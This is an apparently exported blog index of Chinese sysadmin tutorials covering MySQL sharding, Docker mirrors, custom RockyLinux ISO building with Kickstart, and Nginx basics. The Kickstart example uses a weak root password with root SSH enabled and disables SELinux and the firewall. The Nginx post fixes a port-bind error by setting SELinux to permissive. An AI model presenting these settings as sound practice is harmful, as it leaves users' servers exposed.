<li>CPU瓶颈: 排序，分组，连接查询，聚合统计等SQL耗费CPU资源，请求数据太多，CPU出现瓶颈<br>分库分表中心思想是：将数据分散存储，使得单一数据库或表的数据量变小，缓解单一数据库性能问题，从而达到提升数据库性能目的</li>
</ul>
<h2><span id="拆分策略">拆分策略</span></h2><ul>
<li>垂直拆分 (垂直分库, 垂直分表)</li>
<li>水平拆分 (水平分库, 水平分表)</li>
</ul>
<p>** 垂直分库 **<br>以表为依据，根据业务将不同表拆分不同库<br>特点：</p>
<ul>
<li>每个库的表结构不一样</li>
<li>每个库的数据也不一样</li>
<li>所有库的并集是全量数据</li>
</ul>
<p>** 垂直分表 **<br>以字段为依据，根据字段属性将不同字段拆分到不同表中。<br>特点：</p>
<ul>
<li>每个表结构和数据不一样，一般通过一列(主键)关联</li>
<li>所有表并集是全量数据</li>
</ul>
<p>** 水平分库 **<br>以字段为依据，按照一定策略，将一个库数据拆分到多个库中<br>特点：</p>
<ul>
<li>每个库的表结构都一样</li>
<li>每个库的数据都不一样</li>
<li>所有库的并集是全量数据</li>
</ul>
<p>** 水平分表 **<br>以字段为依据，按照一定策略，将一个表数据拆分到多个表中<br>特点:</p>
<ul>
<li>每个表的表结构都一样</li>
<li>每个表的数据都不一样</li>
<li>所有表的并集是全量数据</li>
</ul>
<p>分库分表技术</p>
<ul>
<li>shardingJDBC 只支持Java，性能较高</li>
<li>MyCat 数据库分库分表中间件，支持多种语言 (应用程序 -&gt; MyCat -&gt; MySQL)</li>
</ul>
<h2><span id="mycat">MyCat</span></h2><p>MyCat是开源的，基于Java语言编写的MySQL数据库中间件，可以像使用Mysql一样来使用mycat，对于开发人员来说感知不到MyCat存在</p>
<h2><span id="读写分离">读写分离</span></h2>]]></content>
      <categories>
        <category>MySQL</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title>Docker配置国内源加速</title>
    <url>/2024/1031225813.html</url>
    <content><![CDATA[<h2><span id="配置国内源加速">配置国内源加速</span></h2><p>添加配置文件<code>/etc/docker/daemon.json</code>, 内容如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;registry-mirrors&quot;: [&quot;https://6kx4zyno.mirror.aliyuncs.com&quot;]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>本人使用的是阿里云服务器，所以配了个阿里云的。每个阿里云账号都可以通过以下步骤获取一个镜像加速地址</p>
<ul>
<li>访问阿里云网站(<a href="https://www.aliyun.com),登录账号/">https://www.aliyun.com)，登录账号</a></li>
<li>产品栏搜索(容器镜像服务)ACR</li>
<li>镜像工具 -&gt; 镜像加速器 -&gt; 获取镜像加速地址</li>
</ul>
<h2><span id="使配置生效">使配置生效</span></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl daemon-reload</span><br><span class="line">systemctl restart docker</span><br></pre></td></tr></table></figure>

<h2><span id="测试">测试</span></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker pull busybox</span><br></pre></td></tr></table></figure>

<span id="more"></span>
<h2><span id="参考">参考</span></h2><p><a href="https://www.cnblogs.com/data101/p/18248292">https://www.cnblogs.com/data101/p/18248292</a></p>
]]></content>
      <categories>
        <category>Docker</category>
      </categories>
      <tags>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title>如何定制RockyLinux ISO</title>
    <url>/2024/1105202802.html</url>
    <content><![CDATA[<h1><span id="目标">目标</span></h1><p>基于Rocky9官方ISO做定制，构建自己的ISO</p>
<ul>
<li>可以添加非官方预装的RPM包</li>
<li>实现Kickstart自动化安装, 完成分区等操作</li>
<li>ISO安装后，可以执行自定义脚本，比如安装你手动添加的RPM包</li>
</ul>
<h1><span id="rocky9-官方iso内容分析">Rocky9 官方ISO内容分析</span></h1><p>挂载Rocky9 ISO，得到如下内容:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">BaseOS/</span><br><span class="line">EFI/</span><br><span class="line">images/</span><br><span class="line">isolinux/</span><br><span class="line">LICENSE</span><br><span class="line">media.repo</span><br><span class="line">minimal/</span><br></pre></td></tr></table></figure>
<p>ISO各个目录&#x2F;文件的作用：</p>
<span id="more"></span>
<ul>
<li>BaseOS&#x2F;：这个目录包含了Rocky Linux的基础操作系统环境。它提供了操作系统的核心组件和必要的软件包，用于构建和运行基本的系统</li>
<li>EFI&#x2F;：这个目录包含了用于UEFI（统一可扩展固件接口）启动的文件。这些文件使得系统能够在支持UEFI的硬件上启动</li>
<li>images&#x2F;：这个目录包含了用于云环境的Rocky Linux镜像。这些镜像可以被用于各种云服务提供商，以便于在云中部署Rocky Linux</li>
<li>isolinux&#x2F;：这个目录包含了启动Rocky Linux安装介质所需的引导装载器文件。这些文件负责在系统启动时加载Linux内核和初始化RAM磁盘</li>
<li>minimal&#x2F;：这个目录包含了用于最小化安装的Rocky Linux环境。它通常用于安装一个最小化的Rocky Linux系统，不包括完整的DVD镜像或者通过网络安装</li>
<li>media.repo：这个文件是一个YUM仓库配置文件，它允许用户直接从安装介质（如DVD或USB驱动器）安装软件包。这个文件指定了安装介质中软件包的位置，使得系统能够从本地介质而不是网络仓库安装软件</li>
<li>LICENSE：这个文件包含了Rocky Linux发行版的许可证信息。它说明了用户可以如何使用和分发Rocky Linux</li>
</ul>
<h1><span id="定制iso的流程简述">定制ISO的流程简述</span></h1><ul>
<li>准备一台Rocky9.X编译机, 安装必要编译依赖, 下载Rocky官方的ISO, 挂载ISO。</li>
<li>把自定义的RPM包复制到Packages&#x2F;目录下, 调用createrepo更新RPM信息。</li>
<li>编写ks.cfg,实现kickstart定制化的自动安装</li>
<li>调用genisoimage生成VA的ISO, 调用implantisomd5校验ISO的md5</li>
</ul>
<h1><span id="定制iso的具体步骤">定制ISO的具体步骤</span></h1><h2><span id="0准备一台rockylinux9x编译机安装必要的编译依赖">0.准备一台RockyLinux9.X编译机，安装必要的编译依赖</span></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dnf install -y epel-release genisoimage isomd5sum anaconda \</span><br><span class="line">createrepo mkisofs rsync yum-utils squashfs-tools rpm-build \</span><br><span class="line">glibc-devel krb5-devel autoconf automake pykickstart</span><br></pre></td></tr></table></figure>

<h2><span id="1下载rocky94-minimal官方iso-挂载iso">1.下载Rocky9.4 minimal官方ISO, 挂载ISO</span></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget https://download.rockylinux.org/pub/rocky/9/isos/x86_64/Rocky-9.4-x86_64-minimal.iso</span><br><span class="line">mkdir tmp ISO</span><br><span class="line">mount -o loop Rocky-9.4-x86_64-minimal.iso tmp/</span><br><span class="line">cp -a tmp/* ISO/</span><br></pre></td></tr></table></figure>

<h2><span id="2-添加非预装的rpm包到iso">2. 添加非预装的RPM包到ISO</span></h2><p>添加RPM包的原理是：</p>
<ul>
<li>启动一台新安装的Rocky 9.4的虚拟机或容器, 执行<code>rpm -qa &gt; old_rpm_list</code>记录当前系统的所有RPM包</li>
<li>执行yum install安装RPM包, 安装成功后, 再次执行<code>rpm -qa &gt; new_rpm_list</code></li>
<li>通过diff命令比较new_rpm_list和old_rpm_list的差异, 得到这个RPM包依赖的所有RPM包, 把所有RPM包下载到本地</li>
<li>最后把RPM包都传到ISO的Packages目录, 调用createrepo更新RPM信息</li>
</ul>
<p>	</p>
<p><strong>以安装Squid这个非预装的RPM包为例, 给出具体操作步骤:</strong></p>
<p>新安装一台Rocky9.4的VM，或者启动一个新的Rocky9.4容器，执行如下操作:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rpm -qa &gt; old_rpm_list</span><br><span class="line">yum install -y squid </span><br><span class="line">rpm -qa &gt; new_rpm_list</span><br><span class="line">diff old_rpm_list new_rpm_list</span><br><span class="line">&gt; perl-English-1.11-481.el9.noarch</span><br><span class="line">&gt; perl-Math-Complex-1.59-481.el9.noarch</span><br><span class="line">&gt; perl-Math-BigInt-1.9998.18-460.el9.noarch</span><br><span class="line">&gt; perl-DBI-1.643-9.el9.x86_64</span><br><span class="line">&gt; libecap-1.0.1-10.el9.x86_64</span><br><span class="line">&gt; perl-Digest-SHA-6.02-461.el9.x86_64</span><br><span class="line">&gt; httpd-filesystem-2.4.57-11.el9_4.1.noarch</span><br><span class="line">&gt; squid-5.5-13.el9_4.x86_64</span><br><span class="line"></span><br><span class="line"># 逐一下载上面的RPM包</span><br><span class="line">yum reinstall -y [RPM包] --downloadonly --downloaddir=./</span><br><span class="line"></span><br><span class="line"># 把所有RPM包传到ISO/minimal/Packages目录下</span><br><span class="line"></span><br><span class="line"># 调用createrepo更新RPM信息, 删掉原来的xml</span><br><span class="line">cd ISO/minimal/</span><br><span class="line">createrepo -g repodata/*.xml ./</span><br><span class="line"></span><br><span class="line">执行成功后，查看repodata目录, 可以手动把旧的文件(*.xml.gz,*.bz2)删掉</span><br><span class="line"># ll -rt</span><br><span class="line">-rw-r--r-- 1 root root  223063 May  6  2024 b293fe7dc4f43936b010f1e39498d1c1914ec9b64b239ca295a99024469ad291-other.xml.gz</span><br><span class="line">-rw-r--r-- 1 root root  639692 May  6  2024 910d1caf3c2f6f2be8ec8d1690ade00b3ca742ff265c58bfe8e09564907c7b1f-primary.xml.gz</span><br><span class="line">-rw-r--r-- 1 root root  432959 May  6  2024 6727bfc392a5f0d542bfa33e2e7c66c0acfac68ca643a815ff142eceb83c14eb-filelists.xml.gz</span><br><span class="line">-rw-r--r-- 1 root root  277890 May  6  2024 4844662615d6cdbd59e187e2ff1f4d3aa7fbc153dd28b6024c7eef14e9e14c94-other.sqlite.bz2</span><br><span class="line">-rw-r--r-- 1 root root  546603 May  6  2024 33df6249457b6e40f26bcee5eee9fbecbdb8026b50c9ce3a354001ea04fcaa9d-filelists.sqlite.bz2</span><br><span class="line">-rw-r--r-- 1 root root 1338121 May  6  2024 bd201f63f99e67d65f859f38ab472022f055238d74c78c6dd407ef57c4f0f90d-primary.sqlite.bz2</span><br><span class="line"></span><br><span class="line">-rw-r--r-- 1 root root  288689 Nov  5 22:04 7ec709b6d42da53e7fb35b426e69414a518151eb4814b1fe1703b7b18d519e33-x86_64.xml</span><br><span class="line">-rw-r--r-- 1 root root  644366 Nov  5 22:04 aa896d64b33075d63a1a150b45f78069845b6ba23e1d9b6914028c89d3444343-primary.xml.gz</span><br><span class="line">-rw-r--r-- 1 root root  446349 Nov  5 22:04 96bac81c16728c9c33f8a7da9388ceaeb8fa19a0d173fd3220ca34f5e91e5966-filelists.xml.gz</span><br><span class="line">-rw-r--r-- 1 root root  225673 Nov  5 22:04 4b548eb44fe93e0561e5c451d5d26ae93033ba268276eb953c2a88f3d898d554-other.xml.gz</span><br><span class="line">-rw-r--r-- 1 root root   71732 Nov  5 22:04 d250f7f881bb991be3648c021fb305dd6085b902321b26f52033500ebff7cae1-x86_64.xml.gz</span><br><span class="line">-rw-r--r-- 1 root root  279932 Nov  5 22:04 35a6d5480475ae34480bd0b8eeeeb4954135b980d7585f645f92adc563af724b-other.sqlite.bz2</span><br><span class="line">-rw-r--r-- 1 root root  554441 Nov  5 22:04 131a105582b0b396b43bfe2085074488ec256b9901e115f1699d9ef40f0cbfce-filelists.sqlite.bz2</span><br><span class="line">-rw-r--r-- 1 root root 1352325 Nov  5 22:04 fb6353f4de5dacf439dd366b2caf0d7f8fff4da3dca132dbbd86b820bbed0e28-primary.sqlite.bz2</span><br></pre></td></tr></table></figure>

<h2><span id="3-添加kscfg实现kickstart自动化安装iso">3. 添加ks.cfg，实现Kickstart自动化安装ISO</span></h2><p>比如说我想在ks.cfg中做如下配置:</p>
<ul>
<li>自定义分区。使用LVM分区，添加逻辑卷组(命名为VA)，再分三个区分别挂载到路径(&#x2F; &#x2F;data &#x2F;back)</li>
<li>设置root密码为password@123</li>
<li>设置hostname为localhost.localdomain</li>
<li>把主网卡名称设置为eth0, static IP 192.168.192.3, 掩码255.255.255.252, 网关192.168.192.2, DNS 8.8.8.8</li>
<li>禁用firewall, 关闭selinux</li>
<li>安装自定义的RPM包(Squid)</li>
<li>安装完成后执行一些自定义指令(比如启动Squid,设置Squid开机自启动)</li>
</ul>
<p>注意，我们不需要从零编写ks.cfg，这样太麻烦了。更好的做法是用官方ISO装一台RockyLinux9.4 VM，在图形界面手动完成以上配置，等安装完成后把&#x2F;root&#x2F;anaconda-ks.cfg拷出来，重命名为ks.cfg，再做简单修改即可。<br>ks.cfg内容可以参考：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Generated by Anaconda 34.25.4.9</span><br><span class="line"># Generated by pykickstart v3.32</span><br><span class="line">#version=RHEL9</span><br><span class="line"># Use graphical install</span><br><span class="line">graphical</span><br><span class="line">repo --name=&quot;minimal&quot; --baseurl=file:///run/install/sources/mount-0000-cdrom/minimal</span><br><span class="line"></span><br><span class="line"># Run the Setup Agent on first boot</span><br><span class="line">firstboot --enable</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Keyboard layouts</span><br><span class="line">keyboard --xlayouts=&#x27;us&#x27;</span><br><span class="line"># System language</span><br><span class="line">lang en_US.UTF-8</span><br><span class="line"></span><br><span class="line"># Network information</span><br><span class="line">network  --bootproto=static --device=eth0 --gateway=192.168.192.2 --ip=192.168.192.3 --nameserver=8.8.8.8 --netmask=255.255.255.252 --ipv6=auto --activate</span><br><span class="line">network  --hostname=localhost.localdomain</span><br><span class="line"></span><br><span class="line"># Use CDROM installation media</span><br><span class="line">cdrom</span><br><span class="line"></span><br><span class="line"># System timezone</span><br><span class="line">timezone Asia/Shanghai --utc</span><br><span class="line"></span><br><span class="line"># Root password</span><br><span class="line">rootpw --iscrypted --allow-ssh $6$TUP1uudnSI9B7Z6W$LyM66VXooostM4L8gU1D8Vwh1Si7fnocLA7EdLbpYI8sWvDcf2qS5gu4drGfajfwYMLh6pvXOV/G5A4BFWaxe0</span><br><span class="line"></span><br><span class="line"># System bootloader configuration</span><br><span class="line">bootloader --append=&quot; crashkernel=auto rootdelay=300 systemd.unified_cgroup_hierarchy=1 biosdevname=0 net.ifnames=0&quot; --location=mbr --boot-drive=sda</span><br><span class="line"></span><br><span class="line"># Generated using Blivet version 3.6.0</span><br><span class="line">ignoredisk --only-use=sda</span><br><span class="line"># Partition clearing information</span><br><span class="line">clearpart --none --initlabel</span><br><span class="line"># Disk partitioning information</span><br><span class="line">part /boot --fstype=&quot;ext4&quot; --ondisk=sda --size=1024</span><br><span class="line">part pv.881 --fstype=&quot;lvmpv&quot; --ondisk=sda --size=19450</span><br><span class="line">part biosboot --fstype=&quot;biosboot&quot; --ondisk=sda --size=2</span><br><span class="line">volgroup VA --pesize=4096 pv.881</span><br><span class="line">logvol swap --fstype=&quot;swap&quot; --size=2048 --name=swap --vgname=VA</span><br><span class="line">logvol /back --fstype=&quot;ext4&quot; --size=5120 --name=back --vgname=VA</span><br><span class="line">logvol /data --fstype=&quot;ext4&quot; --size=1024 --name=data --vgname=VA</span><br><span class="line">logvol / --fstype=&quot;ext4&quot; --percent=100 --name=root --vgname=VA</span><br><span class="line"></span><br><span class="line"># Disable SELinux</span><br><span class="line">selinux --disabled</span><br><span class="line"></span><br><span class="line"># # Reboot after installation</span><br><span class="line">reboot --eject</span><br><span class="line"></span><br><span class="line">%packages</span><br><span class="line">@^minimal-environment</span><br><span class="line">@standard</span><br><span class="line"></span><br><span class="line"># Add your RPM packages</span><br><span class="line">squid</span><br><span class="line"></span><br><span class="line">%end</span><br><span class="line"></span><br><span class="line">%addon com_redhat_kdump --enable --reserve-mb=&#x27;auto&#x27;</span><br><span class="line"></span><br><span class="line">%end</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">%post --logfile=/root/ks-post.log</span><br><span class="line"></span><br><span class="line">echo &quot;Post-Script for installation&quot;</span><br><span class="line"></span><br><span class="line">systemctl enable squid</span><br><span class="line">systemctl restart squid</span><br><span class="line"></span><br><span class="line">%end</span><br></pre></td></tr></table></figure>

<p>使用ksvalidator检查ks.cfg语法, 再把ks.cfg拷贝到ISO目录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cp ks.cfg isobuild/isolinux/ks.cfg</span><br></pre></td></tr></table></figure>

<h2><span id="修改isolinuxcfg-grubcfg">修改isolinux.cfg, grub.cfg</span></h2><p><strong>修改ISO中的isolinux.cfg文件</strong><br>需要删掉文件末尾的默认启动菜单, 再添加你的启动菜单，通过inst.ks指定ks.cfg路径，如下:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">label kickstart</span><br><span class="line">  menu label ^Install My Custom ISO(Based on Rocky 9.4)</span><br><span class="line">  menu default</span><br><span class="line">  kernel vmlinuz</span><br><span class="line">  append initrd=initrd.img inst.stage2=hd:LABEL=VA quiet inst.ks=hd:LABEL=VA:/isolinux/ks.cfg inst.text selinux=0 biosdevname=0 net.ifnames=0</span><br></pre></td></tr></table></figure>

<p><strong>修改ISO中的grub.cfg文件</strong><br>需要修改默认的menuentry, 通过inst.ks指定ks.cfg路径，如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">### BEGIN /etc/grub.d/10_linux ###</span><br><span class="line">menuentry &#x27;Install My Custom ISO(Based on Rocky Linux 9.4)&#x27; --class fedora --class gnu-linux --class gnu --class os &#123;</span><br><span class="line">    linuxefi /images/pxeboot/vmlinuz inst.stage2=hd:LABEL=VA quiet inst.ks=hd:LABEL=VA:/isolinux/ks.cfg inst.text selinux=0 biosdevname=0 net.ifnames=0</span><br><span class="line">    initrdefi /images/pxeboot/initrd.img</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2><span id="构建iso">构建ISO</span></h2><p>调用genisoimage生成ISO, 调用implantisomd5校验ISO的md5</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">genisoimage -input-charset utf-8 -U -r -v -T -J -joliet-long -V &quot;VA&quot; -volset &quot;VA&quot; -A &quot;VA&quot; \</span><br><span class="line">-b isolinux/isolinux.bin -c isolinux/boot.cat -no-emul-boot -boot-load-size 4 -boot-info-table \</span><br><span class="line">-eltorito-alt-boot -e images/efiboot.img -no-emul-boot -o custom.iso ISO/</span><br><span class="line"></span><br><span class="line">implantisomd5 custom.iso</span><br></pre></td></tr></table></figure>

<h2><span id="测试-安装iso">测试, 安装ISO</span></h2><p>最后安装ISO, 测试KickStart安装是否成功。</p>
<h2><span id="参考资料">参考资料</span></h2><p><a href="https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/9/html/automatically_installing_rhel/creating-kickstart-files_rhel-installer">https://docs.redhat.com/en/documentation/red_hat_enterprise_linux&#x2F;9&#x2F;html&#x2F;automatically_installing_rhel&#x2F;creating-kickstart-files_rhel-installer</a></p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Project</tag>
      </tags>
  </entry>
  <entry>
    <title>Nginx入门</title>
    <url>/2024/1109151034.html</url>
    <content><![CDATA[<h1><span id="nginx简介">Nginx简介</span></h1><p>高性能的web服务器, 反向代理服务器, 负载均衡器, HTTP缓存</p>
<h1><span id="竞品">竞品</span></h1><ul>
<li>Apache - 老牌Web服务器, 重量级, 高并发差</li>
<li>Lighttpd - 轻量级,高性能Web</li>
<li>Tomcat, Jetty - Java, 重量级Web</li>
<li>IIS - 基于Windows</li>
</ul>
<h1><span id="nginx版本">Nginx版本</span></h1><ul>
<li>Nginx</li>
<li>Nginx plus 商业版</li>
<li>OpenResty</li>
<li>Tengine</li>
</ul>
<h1><span id="nginx应用场景">Nginx应用场景</span></h1><ul>
<li>http服务器(静态服务器)</li>
<li>虚拟主机（一台服务器虚拟多个网站)</li>
<li>反向代理、负载均衡</li>
<li>安全管理, API Gateway, 跨域问题, UrlRewrite</li>
</ul>
<h1><span id="nginx特点x2f为什么用nginx">Nginx特点&#x2F;为什么用Nginx</span></h1><ul>
<li>响应快</li>
<li>高并发(单机支持10w+, 并发连接上限取决与内存)</li>
<li>高扩展性</li>
<li>低内存消耗</li>
<li>高可靠性(worker进程异常退出, master进程可以快速拉起新的worker进程提供服务)</li>
<li>热部署(不停止服务, 升级Nginx的可执行文件, 更新配置，更换日志文件)</li>
<li>配置简单</li>
<li>最自由的BSD许可协议</li>
</ul>
<h1><span id="nginx常用命令">Nginx常用命令</span></h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nginx -h        # 查看Nginx用法</span><br><span class="line">nginx -s reload # 向主进程发HUP信号，重新加载配置文件，热重启</span><br><span class="line">nginx -s reopen # 向主进程发USR1信号，重新打开日志文件</span><br><span class="line">nginx -s quit   # 向主进程发QUIT信号, 处理完所有正在进行请求后再停止服务 (优雅关闭)</span><br><span class="line">nginx -s stop   # 向主进程发TERM信号，立即停止所有服务</span><br><span class="line">nginx -T        # 查看当前配置</span><br><span class="line">nginx -t        # 测试配置是否有问题</span><br></pre></td></tr></table></figure>
<p>stop快速停止服务, worker进程和master进程收到信号后立刻跳出循环<br>quit优雅停止服务, 关闭监听端口,停止接收新连接，把当前连接处理完，最后退出进程</p>
<h1><span id="nginx安装">Nginx安装</span></h1><p><a href="https://pcj600.github.io/2024/1109163902.html">https://pcj600.github.io/2024/1109163902.html</a></p>
<h1><span id="虚拟主机配置">虚拟主机配置</span></h1><p><a href="https://pcj600.github.io/2024/1116173059.html">https://pcj600.github.io/2024/1116173059.html</a></p>
<h2><span id="nginx-location配置">Nginx Location配置</span></h2><p><a href="https://pcj600.github.io/2024/1117141829.html">https://pcj600.github.io/2024/1117141829.html</a></p>
<h2><span id="负载均衡x2f反向代理">负载均衡&#x2F;反向代理</span></h2><p><a href="http://pcj600.github.io/2024/1117165553.html">http://pcj600.github.io/2024/1117165553.html</a></p>
<h2><span id="跨域问题">跨域问题</span></h2><p><a href="https://pcj600.github.io/2024/1119221949.html">https://pcj600.github.io/2024/1119221949.html</a></p>
<h2><span id="nginxkeepalived高可用">Nginx+keepalived高可用</span></h2><p><a href="https://pcj600.github.io/2024/1123135607.html">https://pcj600.github.io/2024/1123135607.html</a></p>
<h2><span id="nginx-urlrewrite">Nginx URLRewrite</span></h2><p><a href="https://pcj600.github.io/2024/1123152532.html">https://pcj600.github.io/2024/1123152532.html</a></p>
<h2><span id="nginx缓存">Nginx缓存</span></h2><p>web缓存种类:</p>
<ul>
<li>客户端缓存(浏览器缓存)</li>
<li>服务端缓存(Nginx&#x2F;Redis&#x2F;Memcached)<br>为了节约网络资源加速浏览，对用户最近请求过文档进行存储，再次请求这个页面时，浏览器就可以从本地磁盘显示文档，加速浏览。</li>
</ul>
<h3><span id="http协议中与缓存相关的header">HTTP协议中与缓存相关的Header</span></h3><p>Expires: 缓存过期的日期和时间<br>Cache-Control: 设置和缓存相关的配置信息<br>Last-Modified: 请求资源最后修改时间(服务端的时间)<br>ETag: 请求变量的实体标签的当前值，例如MD5<br><a href="https://cloud.tencent.com/developer/article/2264687">https://cloud.tencent.com/developer/article/2264687</a><br><a href="https://harttle.land/2017/04/04/using-http-cache.html">https://harttle.land/2017/04/04/using-http-cache.html</a><br><a href="https://blog.csdn.net/sunny_day_day/article/details/107993349">https://blog.csdn.net/sunny_day_day/article/details/107993349</a><br><a href="https://www.cnblogs.com/52linux/archive/2012/04/26/2470865.html">https://www.cnblogs.com/52linux/archive/2012/04/26/2470865.html</a></p>
<ul>
<li>强缓存(直接取本地，不发请求到后端)</li>
<li>弱缓存(问一下后端，后端判断无变化，返回304)</li>
</ul>
<h3><span id="nginx缓存设置todo">Nginx缓存设置(TODO)</span></h3><p>expires指令<br>控制HTTP应答中的”Expires”(1.0的配置，问题是服务端时间和客户端时间存在不一致)和”Cache-Control”</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">expires [modified] time </span><br><span class="line">expires epoch | max | off</span><br></pre></td></tr></table></figure>
<p>no-cache弱缓存</p>
<ul>
<li>time为负数, Cache-Control值为no-cache, 如果为整数, Cache-Control值为max-age&#x3D;time</li>
<li>epoch指定Expires的值为’1, January, 1970,00:00:01 GMT’, Cache-Control值为no-cache</li>
<li>max指定Expires的值’31 December 2037 23:59:59 GMT’, Cache-Control值为10年</li>
<li>off默认不缓存</li>
</ul>
<h2><span id="基于域名的几种互联网需求解析">基于域名的几种互联网需求解析</span></h2><p>hosts泛解析 <a href="https://cloud.tencent.com/developer/article/1534150">https://cloud.tencent.com/developer/article/1534150</a> (dnsmaxq) 本机DNS指向dnsmasq,dnsmasq做泛解析，把域名都解析到同一个IP</p>
<h2><span id="多用户二级域名需求微博">多用户二级域名需求(微博)</span></h2><p>*.weibo.com -&gt; Nginx -&gt; 真正的业务服务器(拿到域名，解析出二级域名)</p>
<h2><span id="短网址">短网址</span></h2><p>*.com&#x2F;asdasjda12312 -&gt; Nginx -&gt; 真正的网址</p>
<h2><span id="nginx安全控制和ssl加密介绍">Nginx安全控制和SSL加密介绍</span></h2><p>(TODO)</p>
<h2><span id="静态资源防盗链">静态资源防盗链</span></h2><p>资源盗链指内容不在自己服务器，而是通过技术手段，绕过别人限制将别人内容放到自己页面上最终显示给用户，盗取大网站流量，用别人的资源搭自己网站<br>浏览器向web请求时，一般会带上referer，来告诉浏览器此网页是从哪个链接跳转过来的<br>后台服务器可以根据Referer判断自己是否为受信任的网站，如果是则放行，不是可以拒绝访问<br>更精细的控制: Nginx第三方模块ngx_http_accesskey_module</p>
<!-- 完美分割线 -->
<h1><span id="nginx进阶高并发网站技术架构实战">Nginx进阶(高并发网站技术架构实战)</span></h1><p>Ingress-Controller<br>Openresty<br><a href="https://www.cnblogs.com/crazymakercircle/p/17052040.html">https://www.cnblogs.com/crazymakercircle/p/17052040.html</a></p>
<h1><span id="内核参数优化">内核参数优化</span></h1><ul>
<li>file-max: 表示进程可以同时打开的最大句柄数，这个参数直接限制最大并发连接数</li>
<li>tcp_tw_reuse: 设为1, 允许将TIME-WAIT的socket重新用于新TCP连接</li>
<li>tcp_fin_timeout: 表示服务器主动关闭连接时, socket保持在FIN_WAIT_2状态最大时间</li>
<li>tcp_max_tw_buckets: 表示OS允许TIME_WAIT套接字数量的最大值, 如果超过这个数字, TIME_WAIT被立刻清除并打印告警, 过多的TIME_WAIT会导致Web服务器变慢</li>
<li>tcp_syncookies: 解决TCP的SYN攻击<br><a href="https://juejin.cn/post/6844904144235413512">https://juejin.cn/post/6844904144235413512</a></li>
</ul>
]]></content>
      <categories>
        <category>Nginx</category>
      </categories>
      <tags>
        <tag>Nginx</tag>
      </tags>
  </entry>
  <entry>
    <title>Nginx bind() to 0.0.0.0:88 failed (13: Permission denied)解决方法</title>
    <url>/2024/1110141108.html</url>
    <content><![CDATA[<h2><span id="问题描述">问题描述</span></h2><p>我在Nginx上添加一个端口号为88的虚拟主机， 重新启动Nginx报错：<code> bind() to 0.0.0.0:88 failed (13: Permission denied)</code></p>
<h2><span id="解决方法">解决方法</span></h2><p>查阅资料，发现这类bind无权限问题，大多由SElinux引起。SELinux有三种模式，如下：</p>
<span id="more"></span>
<ul>
<li>enforcing：强制模式，此时SELinux 运行中</li>
<li>permissive：宽容模式，此时SELinux运行中，会像 enforcing 模式一样加载安全策略，但不会拒绝任何操作。</li>
<li>disabled：关闭，SELinux 没有运行。</li>
</ul>
<p>查看当前SELinux状态，为enforcing</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">getenforce</span><br><span class="line">Enforcing</span><br></pre></td></tr></table></figure>
<p>这里需要使用<code>setenforce</code>把SELinux模式改成Permissive</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">setenforce 0</span><br><span class="line">getenforce</span><br><span class="line">Permissive</span><br></pre></td></tr></table></figure>
<p>再重启Nginx, 问题解决</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl restart nginx</span><br></pre></td></tr></table></figure>
<h2><span id="参考">参考</span></h2><p>【1】<a href="https://docs.redhat.com/zh_hans/documentation/red_hat_enterprise_linux/7/html/selinux_users_and_administrators_guide/sect-security-enhanced_linux-introduction-selinux_modes">https://docs.redhat.com/zh_hans&#x2F;documentation&#x2F;red_hat_enterprise_linux&#x2F;7&#x2F;html&#x2F;selinux_users_and_administrators_guide&#x2F;sect-security-enhanced_linux-introduction-selinux_modes</a><br>【2】<a href="https://blog.csdn.net/qq_45663927/article/details/134857385">https://blog.csdn.net/qq_45663927&#x2F;article&#x2F;details&#x2F;134857385</a></p>
]]></content>
      <categories>
        <category>Nginx</category>
      </categories>
      <tags>
        <tag>Nginx</tag>
      </tags>
  </entry>
  <entry>
    <title>快速安装Nginx</title>
    <url>/2024/1109163902.html</url>
    <content><![CDATA[<h2><span id="安装环境">安装环境</span></h2><p>OS: RockyLinux 9.4</p>
<h2><span id="查看nginx版本">查看Nginx版本</span></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># yum list | grep nginx</span><br><span class="line">nginx.x86_64                                         1:1.20.1-16.el9_4.1                 appstream</span><br><span class="line">nginx-all-modules.noarch                             1:1.20.1-16.el9_4.1                 appstream</span><br><span class="line">nginx-core.x86_64                                    1:1.20.1-16.el9_4.1                 appstream</span><br><span class="line">nginx-filesystem.noarch                              1:1.20.1-16.el9_4.1                 appstream</span><br><span class="line">nginx-mod-http-image-filter.x86_64                   1:1.20.1-16.el9_4.1                 appstream</span><br><span class="line">nginx-mod-http-perl.x86_64                           1:1.20.1-16.el9_4.1                 appstream</span><br><span class="line">nginx-mod-http-xslt-filter.x86_64                    1:1.20.1-16.el9_4.1                 appstream</span><br><span class="line">nginx-mod-mail.x86_64                                1:1.20.1-16.el9_4.1                 appstream</span><br><span class="line">nginx-mod-stream.x86_64                              1:1.20.1-16.el9_4.1                 appstream</span><br><span 